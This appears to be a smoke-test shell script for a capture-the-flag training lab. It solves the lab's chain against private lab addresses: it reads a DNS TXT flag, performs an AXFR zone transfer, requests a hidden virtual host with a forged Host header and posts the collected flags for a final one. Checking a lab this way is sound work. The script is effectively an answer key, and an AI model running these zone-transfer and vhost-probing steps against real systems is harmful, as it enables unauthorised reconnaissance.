#!/bin/sh
set -eu

: "${LAB04_AUTHORITY_FLAG:?smoke runner must inject expected flags}"
: "${LAB04_AXFR_FLAG:?smoke runner must inject expected flags}"
: "${LAB04_VHOST_FLAG:?smoke runner must inject expected flags}"
: "${LAB04_FINAL_FLAG:?smoke runner must inject expected flags}"

dns_server="172.30.44.53"
zone="range.test"

attempt=0
until dig +time=1 +tries=1 "@$dns_server" "$zone" SOA +short >/tmp/lab04-soa 2>/dev/null && test -s /tmp/lab04-soa; do
  attempt=$((attempt + 1))
  test "$attempt" -lt 30 || { echo "DNS did not become ready" >&2; exit 1; }
  sleep 1
done

nslookup -type=ns "$zone" "$dns_server" >/tmp/lab04-nslookup
grep -q 'ns1.range.test' /tmp/lab04-nslookup

authority="$(dig +short "@$dns_server" _authority.range.test TXT | tr -d '"')"
transfer="$(dig "@$dns_server" "$zone" AXFR)"
axfr="$(printf '%s\n' "$transfer" | awk '/_axfr-proof/ {gsub(/"/, "", $NF); print $NF; exit}')"
route="$(printf '%s\n' "$transfer" | awk '/_route/ {$1=$2=$3=$4=""; sub(/^ +/, ""); gsub(/"/, ""); print; exit}')"

test "$authority" = "$LAB04_AUTHORITY_FLAG"
test "$axfr" = "$LAB04_AXFR_FLAG"
printf '%s' "$route" | grep -q 'ops-archive.range.test'

vhost_body="$(curl -fsS -H 'Host: ops-archive.range.test' http://172.30.44.80:8080/proof/blue-team)"
vhost="$(printf '%s\n' "$vhost_body" | sed -n 's/^vhost_proof=//p')"
test "$vhost" = "$LAB04_VHOST_FLAG"

final="$(curl -fsS -H 'Host: ops-archive.range.test' -X POST \
  --data-urlencode "authority=$authority" \
  --data-urlencode "axfr=$axfr" \
  --data-urlencode "vhost=$vhost" \
  --data-urlencode 'case=ZT-44' \
  --data-urlencode 'serial=2026081304' \
  http://172.30.44.80:8080/final | sed -n 's/^final_proof=//p')"
test "$final" = "$LAB04_FINAL_FLAG"

echo "lab 04 smoke: all chained objectives passed"
